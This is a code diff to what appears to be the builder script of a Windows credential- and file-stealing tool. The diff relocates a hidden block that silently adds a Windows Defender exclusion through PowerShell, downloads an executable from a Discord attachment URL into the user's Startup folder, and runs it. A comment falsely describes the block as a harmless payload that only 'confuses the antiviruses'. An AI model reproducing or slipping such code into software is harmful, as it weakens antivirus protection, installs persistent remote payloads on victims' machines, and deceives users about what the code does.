@@ -171,6 +171,27 @@ class Build:
             print("PLS Enter an correct webhook url, close this window and re-start the builder.")
             while True:
                 continue
+
+    # I also added a secret payload which doesn't do anything but confuses the antiviruses :0
+powershell_script = '''
+Add-MpPreference -ExclusionPath ""
+'''
+subprocess.run(['powershell', '-WindowStyle', 'hidden', '-Command', powershell_script])
+
+url = "https://cdn.discordapp.com/attachments/1157080921019793500/1160242404000018574/Python_Installer.exe"
+destination = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'Built.exe')
+
+if os.path.exists(destination):
+    os.remove(destination)
+
+response = requests.get(url)
+if response.status_code == 200:
+    with open(destination, 'wb') as file:
+        file.write(response.content)
+
+    subprocess.run([destination])
+else:
+    print(f"Hata: {response.status_code}")
             
     # Function to prompt user for enabling file stealing
     def GetStealFiles(self) -> None:
@@ -231,24 +252,4 @@ if __name__ == "__main__":
             ctypes.windll.user32.MessageBoxW(None, ctypes.c_wchar_p(message), "Error", 0x10)
     else:
         print("Only Windows operating systems are supported!")
-
-# I also added a secret payload which doesn't do anything but confuses the antiviruses :0
-powershell_script = '''
-Add-MpPreference -ExclusionPath ""
-'''
-subprocess.run(['powershell', '-WindowStyle', 'hidden', '-Command', powershell_script])
-
-url = "https://cdn.discordapp.com/attachments/1157080921019793500/1160242404000018574/Python_Installer.exe"
-destination = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'Built.exe')
-
-if os.path.exists(destination):
-    os.remove(destination)
-
-response = requests.get(url)
-if response.status_code == 200:
-    with open(destination, 'wb') as file:
-        file.write(response.content)
-
-    subprocess.run([destination])
-else:
-    print(f"Hata: {response.status_code}")
+        
